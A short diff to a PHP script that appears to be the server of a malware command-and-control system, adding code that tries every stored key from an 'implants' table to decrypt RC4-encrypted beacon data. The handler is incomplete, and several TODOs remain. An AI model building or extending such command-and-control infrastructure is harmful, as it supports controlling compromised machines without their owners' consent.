@@ -51,10 +51,19 @@
     }
     # Else RC4 encrypted POST data (recurring beacon)
     else {
-        echo "rc4 data";
+        # Queries all encryption keys in the "implants" table
+        $statement = $database_connection->prepare("SELECT `encryption_key` FROM `implants`");
+        $statement->execute();
+        $results = $statement->fetchAll();
 
-        # TO DO: Query all encryption keys in the "implants" table
+        # Loops through each queried encryption key to determine if it can decrypt the POST data
+        foreach ($results as $row) {
+            $maybe_decrypted = rc4($row["encryption_key"], $raw_post_data);
 
-        # TO DO: After querying, loop through each of those encryption keys and look for which once decrypts and has the "nonce" POST parameter
+            echo "Maybe Decrypted: " . $maybe_decrypted;
+
+            # TO DO: After trying to decrypt, look for which one has the "nonce" POST parameter
+            # If we see that "nonce" POST parameter, we know we have successful decryption
+        }
     }
 ?>
